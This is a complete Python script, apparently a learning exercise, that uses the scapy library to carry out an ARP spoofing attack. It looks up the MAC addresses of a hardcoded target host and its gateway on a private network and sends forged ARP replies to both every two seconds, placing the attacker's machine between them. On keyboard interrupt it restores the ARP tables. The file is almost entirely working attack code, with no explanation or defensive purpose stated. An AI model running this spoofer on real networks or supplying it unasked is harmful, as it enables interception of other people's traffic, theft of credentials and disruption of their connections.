#!/usr/bin/env python
from tabnanny import verbose
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    ether = scapy.Ether(dst=target_mac)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether / arp
    scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    ether = scapy.Ether(dst=destination_mac)
    arp = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    packet = ether / arp
    scapy.sendp(packet, count=4, verbose=False)

target_ip = "192.168.85.159"
gateway_ip = "192.168.85.2"
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

try:
   packets_sent_count = 0
   while True:
    spoof(target_ip, gateway_ip, target_mac)
    spoof(gateway_ip, target_ip, gateway_mac)
    packets_sent_count = packets_sent_count + 2
    print("\r[+] Sent " + str(packets_sent_count), end="")
    sys.stdout.flush()
    time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL +C .....Resetting ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)